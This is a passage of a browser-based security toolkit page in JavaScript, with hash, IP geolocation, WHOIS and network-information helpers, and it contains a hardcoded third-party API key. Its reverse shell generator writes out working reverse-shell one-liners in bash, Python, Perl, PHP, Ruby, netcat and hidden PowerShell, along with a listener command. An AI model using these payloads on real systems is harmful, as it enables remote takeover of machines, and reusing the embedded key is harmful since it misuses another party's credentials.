                return `${algorithm.toUpperCase()} Hash:\n${hashHex}`;
            } catch (error) {
                return `Error generating hash: ${error.message}`;
            }
        }

        // Updated IP Geolocation function
        async function getIpGeolocation(ip) {
            try {
                // If no IP is provided, get the user's IP
                if (!ip) {
                    try {
                        const response = await fetch('https://api.ipify.org?format=json');
                        const data = await response.json();
                        ip = data.ip;
                    } catch (error) {
                        // Fallback method to get user IP
                        const response = await fetch('https://api64.ipify.org?format=json');
                        const data = await response.json();
                        ip = data.ip;
                    }
                }
                
                // Use a CORS proxy for ipgeolocation.io which supports HTTPS
                const geoResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=06e7f9876ade424ba74f5d30a1da3d48&ip=${ip}`);
                const geoData = await geoResponse.json();
                
                // Format the result
                let result = `IP Geolocation for: ${geoData.ip}\n\n`;
                
                // Basic info
                result += `Country: ${geoData.country_name || 'Unknown'} (${geoData.country_code2 || '?'})\n`;
                result += `Region: ${geoData.state_prov || 'Unknown'}\n`;
                result += `City: ${geoData.city || 'Unknown'}\n`;
                result += `Postal Code: ${geoData.zipcode || 'Unknown'}\n\n`;
                
                // Coordinates
                result += `Latitude: ${geoData.latitude || 'Unknown'}\n`;
                result += `Longitude: ${geoData.longitude || 'Unknown'}\n`;
                
                // If we have coordinates, add a Google Maps link
                if (geoData.latitude && geoData.longitude) {
                    const mapsUrl = `https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude}`;
                    result += `Map: ${mapsUrl}\n\n`;
                } else {
                    result += '\n';
                }
                
                // Network info
                result += `Timezone: ${geoData.time_zone?.name || 'Unknown'}\n`;
                result += `ISP: ${geoData.isp || 'Unknown'}\n`;
                result += `Organization: ${geoData.organization || 'Unknown'}\n`;
                
                return result;
                
            } catch (error) {
                // Final fallback using geoiplookup.io
                try {
                    const fallbackResponse = await fetch(`https://json.geoiplookup.io/${ip}`);
                    const fallbackData = await fallbackResponse.json();
                    
                    if (fallbackData && fallbackData.country_name) {
                        let result = `IP Geolocation for: ${fallbackData.ip}\n\n`;
                        
                        result += `Country: ${fallbackData.country_name || 'Unknown'} (${fallbackData.country_code || '?'})\n`;
                        result += `Region: ${fallbackData.region || 'Unknown'}\n`;
                        result += `City: ${fallbackData.city || 'Unknown'}\n\n`;
                        
                        if (fallbackData.latitude && fallbackData.longitude) {
                            result += `Latitude: ${fallbackData.latitude}\n`;
                            result += `Longitude: ${fallbackData.longitude}\n`;
                            const mapsUrl = `https://www.google.com/maps?q=${fallbackData.latitude},${fallbackData.longitude}`;
                            result += `Map: ${mapsUrl}\n\n`;
                        }
                        
                        result += `ISP: ${fallbackData.isp || 'Unknown'}\n`;
                        result += `Organization: ${fallbackData.org || 'Unknown'}\n`;
                        
                        return result;
                    }
                } catch (fallbackError) {
                    // If all APIs fail, provide detailed error message
                    return `Error retrieving geolocation data: ${error.message}\n\nThe IP-API free service requires HTTP rather than HTTPS, which most browsers block for security reasons. Try using a different IP lookup service.`;
                }
                
                return `Error retrieving geolocation data: ${error.message}\n\nTry with a different IP address or try one of the other tools.`;
            }
        }

        // 9. WHOIS Lookup
        async function performWhoisLookup(domain) {
            try {
                // Direct WHOIS queries aren't possible from client-side JavaScript due to CORS
                // Instead, we'll provide links to public WHOIS services
                let result = `WHOIS Information for ${domain}:\n\n`;
                result += `Due to browser security restrictions, direct WHOIS queries cannot be performed client-side.\n\n`;
                result += `You can view WHOIS information for ${domain} at these services:\n\n`;
                
                result += `1. ICANN Lookup:\n   https://lookup.icann.org/en/lookup?q=${domain}\n\n`;
                result += `2. who.is:\n   https://who.is/whois/${domain}\n\n`;
                result += `3. whois.domaintools.com:\n   https://whois.domaintools.com/${domain}\n\n`;
                
                // Add domain age estimation (when possible)
                try {
                    const dnsResponse = await fetch(`https://dns.google/resolve?name=${domain}&type=SOA`);
                    const dnsData = await dnsResponse.json();
                    
                    if (dnsData.Answer && dnsData.Answer.length > 0) {
                        result += `Domain DNS Information:\n`;
                        dnsData.Answer.forEach(record => {
                            result += `- SOA Record: ${record.data}\n`;
                        });
                    }
                } catch (e) {
                    // DNS lookup failed, continue without it
                }
                
                return result;
            } catch (error) {
                return `Error performing WHOIS lookup: ${error.message}`;
            }
        }

        // 10. Network Information
        function getNetworkInformation() {
            let result = "Your Network Information:\n\n";
            
            // Get public IP (when possible)
            result += "Getting public IP information...\n";
            
            return new Promise(async (resolve) => {
                try {
                    const ipResponse = await fetch("https://api.ipify.org?format=json");
                    const ipData = await ipResponse.json();
                    
                    if (ipData.ip) {
                        result += `Public IP: ${ipData.ip}\n`;
                        
                        // Try to get more details about this IP
                        try {
                            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                            const geoData = await geoResponse.json();
                            
                            if (!geoData.error) {
                                result += `Country: ${geoData.country_name} (${geoData.country_code})\n`;
                                result += `City: ${geoData.city || 'Unknown'}\n`;
                                result += `ISP: ${geoData.org || 'Unknown'}\n`;
                            }
                        } catch (e) {
                            // Continue without geolocation
                        }
                    }
                } catch (e) {
                    result += "Unable to retrieve public IP information\n";
                }
                
                // Browser connection information
                result += "\nBrowser Network Information:\n";
                
                if (navigator.connection) {
                    const connection = navigator.connection;
                    result += `Connection Type: ${connection.effectiveType || 'Unknown'}\n`;
                    result += `Downlink: ${connection.downlink || 'Unknown'} Mbps\n`;
                    result += `RTT: ${connection.rtt || 'Unknown'} ms\n`;
                    result += `Save Data Mode: ${connection.saveData ? 'Enabled' : 'Disabled'}\n`;
                } else {
                    result += "Connection information not available in this browser\n";
                }
                
                // Basic WebRTC IP detection (only works in some browsers)
                if (window.RTCPeerConnection) {
                    result += "\nAttempting to detect local IPs...\n";
                    result += "Note: This may not work in all browsers due to privacy restrictions.\n";
                    
                    const pc = new RTCPeerConnection({
                        iceServers: []
                    });
                    
                    pc.createDataChannel("");
                    pc.createOffer()
                        .then(offer => pc.setLocalDescription(offer))
                        .catch(err => {
                            result += `WebRTC IP detection failed: ${err.toString()}\n`;
                            resolve(result);
                        });
                    
                    let ipsFound = false;
                    pc.onicecandidate = (event) => {
                        if (event && event.candidate && event.candidate.candidate) {
                            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
                            if (ipMatch && ipMatch.length > 1) {
                                const ip = ipMatch[1];
                                if (ip !== "0.0.0.0") {
                                    result += `Local IP: ${ip}\n`;
                                    ipsFound = true;
                                }
                            }
                        } else if (!ipsFound) {
                            result += "No local IPs detected\n";
                            pc.close();
                            resolve(result);
                        }
                    };
                    
                    // Fallback - resolve after 3 seconds if no candidates are found
                    setTimeout(() => {
                        if (!ipsFound) {
                            result += "No local IPs detected within timeout period\n";
                        }
                        pc.close();
                        resolve(result);
                    }, 3000);
                } else {
                    result += "\nWebRTC IP detection not available in this browser\n";
                    resolve(result);
                }
            });
        }

        // 11. Reverse Shell Generator
        function generateReverseShell(ip, port, type) {
            if (!ip || !port) {
                return "IP address and port are required.";
            }
            
            let command = "";
            let description = "";
            
            switch (type) {
                case "bash":
                    command = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    description = "Bash TCP";
                    break;
                case "python":
                    command = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
                    description = "Python";
                    break;
                case "perl":
                    command = `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
                    description = "Perl";
                    break;
                case "php":
                    command = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                    description = "PHP";
                    break;
                case "ruby":
                    command = `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
                    description = "Ruby";
                    break;
                case "netcat":
                    command = `nc -e /bin/sh ${ip} ${port}`;
                    description = "Netcat";
                    break;
                case "powershell":
                    command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
                    description = "PowerShell";
                    break;
                default:
                    return "Invalid shell type selected.";
            }
            
            let result = `${description} Reverse Shell for ${ip}:${port}\n\n`;
            result += `Command:\n${command}\n\n`;
            result += `To use this, start a listener on your machine with:\nnc -lvnp ${port}\n\n`;
            result += `IMPORTANT: Use this for educational and ethical security testing purposes only.`;
            
            return result;
        }

        // Event Handlers
        $(document).ready(function() {
            // 1. Password Strength Checker
            $('#passwordForm').on('submit', function(e) {
                e.preventDefault();
                const password = $('#passwordInput').val();
                const result = passwordStrengthChecker(password);
                $('#passwordResult').text(result);
            });

            // 2. OSINT Toolkit
            $('#osintForm').on('submit', async function(e) {
                e.preventDefault();
                const query = $('#osintInput').val();
                const resultHTML = await performRealOsintSearch(query);
                $('#osintResult').html(resultHTML);
            });

            // 3. Port Scanner
            $('#portScannerForm').on('submit', async function(e) {
                e.preventDefault();
                const host = $('#hostInput').val();
                const startPort = parseInt($('#portRangeStart').val());
                const endPort = parseInt($('#portRangeEnd').val());
                
                $('#portScannerResult').text('Starting port scan... This may take a moment.');
                const result = await portScanner(host, startPort, endPort);
                $('#portScannerResult').text(result);
            });

            // 4. HTTP Header Analysis
            $('#httpHeaderForm').on('submit', async function(e) {
                e.preventDefault();
                const url = $('#urlInput').val();
                
                $('#httpHeaderResult').text('Analyzing HTTP headers... This may take a moment.');
                const result = await analyzeHttpHeaders(url);
                $('#httpHeaderResult').text(result);
            });

            // 5. Email Validator
            $('#emailValidatorForm').on('submit', async function(e) {
                e.preventDefault();
                const email = $('#emailInput').val();
                
                $('#emailValidatorResult').text('Validating email... Please wait.');
                const result = await validateEmail(email);
                $('#emailValidatorResult').text(result);
            });

            // 6. DNS Resolver
            $('#dnsResolverForm').on('submit', async function(e) {
                e.preventDefault();
                const domain = $('#domainInput').val();
                const recordType = $('#recordType').val();
                
                $('#dnsResolverResult').text('Resolving DNS... Please wait.');
                const result = await resolveDns(domain, recordType);
                $('#dnsResolverResult').text(result);
            });

            // 7. Hash Generator
            $('#hashGeneratorForm').on('submit', async function(e) {
                e.preventDefault();
                const text = $('#textToHash').val();
                const algorithm = $('#hashAlgorithm').val();
                
                $('#hashGeneratorResult').text('Generating hash... Please wait.');
                const result = await generateHash(text, algorithm);
                $('#hashGeneratorResult').text(result);
            });

            // 8. IP Geolocation
            $('#geolocateForm').on('submit', async function(e) {
                e.preventDefault();
                const ip = $('#ipAddressInput').val();
                
                $('#geolocateResult').text('Retrieving geolocation data... Please wait.');
                const result = await getIpGeolocation(ip);
                $('#geolocateResult').text(result);
            });

            // 9. WHOIS Lookup
            $('#whoisForm').on('submit', async function(e) {
                e.preventDefault();
                const domain = $('#whoisDomainInput').val();
                
                $('#whoisResult').text('Performing WHOIS lookup... Please wait.');
                const result = await performWhoisLookup(domain);
                $('#whoisResult').text(result);
            });

            // 10. Network Information
            $('#getNetworkInfo').on('click', async function() {
                $('#networkInfoResult').text('Gathering network information... Please wait.');
                const result = await getNetworkInformation();
                $('#networkInfoResult').text(result);
            });

            // 11. Reverse Shell Generator
            $('#reverseShellForm').on('submit', function(e) {
                e.preventDefault();
                const ip = $('#shellIp').val();
                const port = $('#shellPort').val();
                const type = $('#shellType').val();
                
                const result = generateReverseShell(ip, port, type);
                $('#reverseShellResult').text(result);
            });
        });
    </script>
</body>
</html>